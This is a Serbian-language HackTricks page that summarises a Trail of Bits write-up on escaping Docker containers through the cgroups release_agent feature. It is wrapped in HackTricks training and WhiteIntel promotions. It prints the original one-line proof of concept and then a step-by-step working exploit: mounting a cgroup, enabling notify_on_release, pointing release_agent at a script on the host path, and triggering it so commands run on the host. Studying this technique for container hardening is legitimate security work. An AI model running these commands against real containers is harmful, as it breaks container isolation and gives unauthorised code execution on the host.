# Bekstvo iz cgroups-a pomoću Docker release\_agent

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraživač pokretan **dark web-om** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **kradljivih malvera**.

Primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomware-a koji proizilaze iz malvera za krađu informacija.

Možete posetiti njihovu veb lokaciju i isprobati njihovu mašinu **besplatno** na:

{% embed url="https://whiteintel.io" %}

***

**Za dalje detalje, pogledajte** [**originalni blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Ovo je samo sažetak:

Originalni PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Dokazni koncept (PoC) demonstrira metod za iskorišćavanje cgroups-a kreiranjem `release_agent` fajla i pokretanjem njegovog poziva za izvršavanje proizvoljnih komandi na hostu kontejnera. Evo detaljnog opisa koraka uključenih u postupak:

1. **Priprema Okruženja:**
* Kreiran je direktorijum `/tmp/cgrp` koji će služiti kao tačka montiranja za cgroup.
* RDMA cgroup kontroler je montiran na ovaj direktorijum. U slučaju odsustva RDMA kontrolera, predlaže se korišćenje `memory` cgroup kontrolera kao alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Postavite podgrupu:**
* Unutar montiranog direktorijuma podgrupa se kreira pod imenom "x".
* Obaveštenja se omogućavaju za podgrupu "x" upisivanjem 1 u njen fajl notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Konfigurišite Release Agent:**
* Putanja kontejnera na domaćinu se dobija iz fajla /etc/mtab.
* Zatim se konfiguriše release\_agent fajl cgroup-a da izvrši skriptu nazvanu /cmd koja se nalazi na dobijenoj putanji domaćina.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Kreiranje i konfigurisanje skripte /cmd:**
* Skripta /cmd se kreira unutar kontejnera i konfiguriše se da izvrši ps aux, preusmeravajući izlaz u datoteku nazvanu /output u kontejneru. Specifikovan je pun put do /output na domaćinu.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Pokrenite napad:**
* Proces je pokrenut unutar "x" pod-cgroup-a i odmah je završen.
* Ovo pokreće `release_agent` (skriptu /cmd), koja izvršava ps aux na hostu i zapisuje izlaz u /output unutar kontejnera.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraživač pokrenut na **dark webu** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **ugroženi** od **malvera koji krade podatke**.

Njihov primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomvera koji proizilaze iz malvera za krađu informacija.

Možete posetiti njihovu veb lokaciju i isprobati njihovu mašinu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
